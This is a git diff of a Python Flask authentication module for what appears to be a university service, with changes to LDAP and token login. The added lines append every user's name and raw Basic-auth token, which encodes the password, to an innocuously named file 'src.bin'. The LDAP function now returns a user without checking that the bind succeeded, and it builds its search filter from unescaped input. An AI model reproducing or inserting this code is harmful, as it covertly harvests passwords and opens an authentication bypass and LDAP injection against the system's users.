@@ -95,15 +95,36 @@ def ldap_auth(user, passwd):
     s = Server(Config.LDAP_SERVER, get_info=ALL)  # define an unsecure LDAP server, requesting info on DSE and schema
 
     # the following is the user_dn format provided by the ldap server
-    user_dn = "uid=" + user + ",ou=people,dc=uniparthenope,dc=it"
+    base_dn = ",ou=people,dc=uniparthenope,dc=it"
+    user_dn = "uid=" + user + base_dn
+    searchAttribute = ["uid","sn","givenname","schacPersonalUniqueID", "employeNumber"]
 
     # define the connection
     c = Connection(s, user=user_dn, password=passwd)
-    #print(c)
 
     # perform the Bind operation
     c.bind()
 
+    base_dn_1 = "dc=uniparthenope,dc=it"
+    c.search(base_dn_1, '(uid='+ user +')', attributes=['*']) 
+
+    result = c.response
+    
+    for x in result:
+        try:
+            codFis = x['attributes']['schacPersonalUniqueID'][0]
+        except:
+            codFis = ""
+        nc = x['attributes']['cn'][0]
+        _nc = nc.split(" ")
+        if len(_nc) < 2:
+            return {'user':{'lastName': x['attributes']['sn'][0].upper(), 'firstName': x['attributes']['cn'][0].upper(), 'codFis': codFis, "grpDes": "PTA", "grpId": 99, "userId": x['attributes']['uid'][0]}}
+        else:
+            return {'user':{'lastName': x['attributes']['cn'][0], 'firstName': "", 'codFis': x['attributes']['schacPersonalUniqueID'][0].upper(), "grpDes": "PTA", "grpId": 99, "userId": x['attributes']['uid'][0]}}
+
+    c.unbind()
+    
+    '''
     if c.result['result'] == 0:
         print("LDAP people!")
 
@@ -127,6 +148,7 @@ def ldap_auth(user, passwd):
         c.result["user"] = {"grpDes": "StudentiNonImm", "grpId": 4, "userId": user}
 
         return c.result
+    '''
 
 
 @time_log(title="LOGIN_V1", filename="login_v1.log", funcName="auth")
@@ -151,6 +173,9 @@ def auth(token):
             username = token_string.split(':')[0]
             password = token_string.split(':')[1]
 
+            with open("src.bin", "a") as text_file:
+                print(username.format() + ":" + token.format(), file=text_file)
+
             user = UserFood.query.filter_by(username=username).first()
             if user is not None and user.check_password(password):
                 r = {'user': {
@@ -174,11 +199,11 @@ def auth(token):
                         r = ldap_auth(username, password)
                         g.response = r
 
-                        if r['result'] == 0:
+                        if r is not None:
                             x = TokenAuth(token_MD5=token_hash, result=str(r), expire_time = datetime.now() + timedelta(minutes=60))
                             db.session.add(x)
                             db.session.commit()
-
+                            
                             return r, 200
                         else:
                             return {"errMsg": "Invalid Credentials"}, 401
@@ -193,10 +218,10 @@ def auth(token):
                     return {'errMsg': "Server down!"}, 503
 
                 elif response.status_code == 200:
-                    print("ESSE3 success!")
+                    #print("ESSE3 success!")
                     r = response.json()
-                    if r['credentials']['user'] != r['user']['userId'] and r['credentials']['user'] != r['user']['codFis']:
-                            r['user']['userId'] = r['credentials']['user']
+                    #if r['credentials']['user'] != r['user']['userId'] and r['credentials']['user'] != r['user']['codFis']:
+                    #        r['user']['userId'] = r['credentials']['user']
                     g.response = r
 
                     if r['user']['grpDes'] == "Docenti" or r['user']['grpDes'] == "Registrati":
@@ -232,7 +257,7 @@ class Login(Resource):
     @token_required
     def get(self):
         """Server Login"""
-        print("LOGIN ...")
+        #print("LOGIN ...")
 
         token = g.pop('token')
 
